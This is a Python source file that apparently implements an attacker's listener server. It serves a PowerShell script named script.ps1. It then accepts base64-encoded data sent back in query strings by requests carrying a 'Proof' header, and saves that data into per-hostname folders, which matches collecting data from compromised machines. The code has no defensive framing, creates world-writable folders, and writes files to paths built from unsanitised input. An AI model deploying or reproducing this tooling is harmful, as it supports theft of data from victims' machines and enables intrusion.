from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from urllib.parse import unquote
import os
import logging
import base64
from datetime import datetime

CURRENT_DIR = os.getcwd()
HOST = '0.0.0.0'
PORT = 8000

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_request(self, code):
        log('[+] New connection from [' + self.client_address[0] + ':' + str(self.client_address[1]) + ']',print_console=True,trace_time=True)
        log(self.command  + ' ' + self.path + ' ' + self.request_version + '\r' + str(self.headers),print_console=True,trace_time=False)

    def do_GET(self):
        headers = self.headers
        if self.path == '/script.ps1':
            try:
                file_to_open = open('script.ps1','r').read()
                self.send_response(200)
                self.send_header('Content-type', 'text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open, 'utf-8'))
                log('[+] File script.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                file_to_open.close()
            except:
                log('[-] File script.ps1 does not exist.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif headers['Proof']:    
            if '?' in self.path:
                self.send_response(200)
                self.send_header('Content-type', 'text')
                self.end_headers()
                self.wfile.write(b'Ok')
                params = parseURL(self.path)
                if params is not None:
                    if 'hostname' in params:
                        hostname_bytes = base64.b64decode(unquote(params['hostname'])).replace(b'\x00',b'')
                        hostname_str = hostname_bytes.decode("windows-1252")
                        if not os.path.exists(CURRENT_DIR + '/' + hostname_str):
                            os.mkdir(CURRENT_DIR + '/' + hostname_str,mode = 0o777)
                            log('[+] Created folder: ' + CURRENT_DIR + '/' + hostname_str,print_console=True,trace_time=True)
                        else:
                            pass
                        for key in params:
                            if key != 'hostname':
                                param = params[key]
                                param_bytes = base64.b64decode(unquote(param))
                                param_str = param_bytes.decode("windows-1252")
                                file = open(CURRENT_DIR + '/' + hostname_str + '/' + key + '.txt','w+',encoding='windows-1252')
                                file.write(param_str)
                                file.close()
                                log('[+] File written: ' + CURRENT_DIR + '/' + hostname_str + '/' + key + '.txt\n',print_console=True,trace_time=True)
                    else:
                        for key in params:
                            if key != 'hostname':
                                param = params[key]
                                param_bytes = base64.b64decode(unquote(param))
                                param_str = param_bytes.decode("windows-1252")
                                file = open(CURRENT_DIR + '/' + key + '.txt','w+',encoding='windows-1252')
                                file.write(param_str)
                                file.close()
                                log('[+] File written: ' + CURRENT_DIR + '/' + key + '.txt\n',print_console=True,trace_time=True)
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text')
                self.end_headers()
                self.wfile.write(b'Ok')
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Not Found')


#Loggin function of events in the current folder
#To print the logs in console output, set log(Text,True)
def log(text,print_console=False,trace_time=True):
    current_datetime = datetime.now()
    current_date_time = current_datetime.strftime('%Y-%m-%d %H:%M:%S')
    log_file = open(CURRENT_DIR + '/' + 'logs.txt','a',encoding='windows-1252')
    if trace_time:
        log_file.write(current_date_time + "  " + text + '\r')
    else:
        log_file.write(text + '\r')
    log_file.close()
    if print_console:
        print(text)

#Returns a dictionary with GET parameters : {'param1':'value1',...}
def parseURL(path):
    result = {}
    query = urlparse(path).query
    if query is not None and query != '':
        query_split = query.split('&')
        for el in query_split:
            subsplit = el.split("=")
            key = subsplit[0]
            result[key] = subsplit[1]
        return result
    else:
        return None


httpd = HTTPServer((HOST,PORT), SimpleHTTPRequestHandler)
log("[+] Starting server on " + HOST + ":" + str(PORT),print_console=True,trace_time=True)
httpd.serve_forever()
